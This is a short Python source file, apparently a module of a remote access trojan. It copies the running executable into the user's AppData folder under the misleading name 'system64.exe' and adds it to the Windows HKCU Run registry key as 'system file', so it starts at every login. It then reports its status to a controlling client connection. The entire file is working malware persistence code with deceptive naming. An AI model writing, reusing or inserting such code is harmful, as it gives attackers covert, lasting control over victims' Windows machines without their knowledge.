from core.utils import display_msg
import os
import shutil
import winreg
import sys


def become_persistent(client):

    curr_executable = sys.executable

    app_data = os.getenv("APPDATA")
    to_save_file = app_data +"\\"+"system64.exe"

    if not os.path.exists(to_save_file):
        display_msg("Becoming Persistent")
        shutil.copyfile(curr_executable, to_save_file)

        key = winreg.HKEY_CURRENT_USER

        # "Software\Microsoft\Windows\CurrentVersion\Run"

        key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"

        key_obj = winreg.OpenKey(key, key_value, 0, winreg.KEY_ALL_ACCESS)

        winreg.SetValueEx(key_obj, "system file", 0, winreg.REG_SZ, to_save_file)

        winreg.CloseKey(key_obj)
        client.send_data("Successfuully Became Persistent")
    else:
        client.send_data("Already Persistent")
    
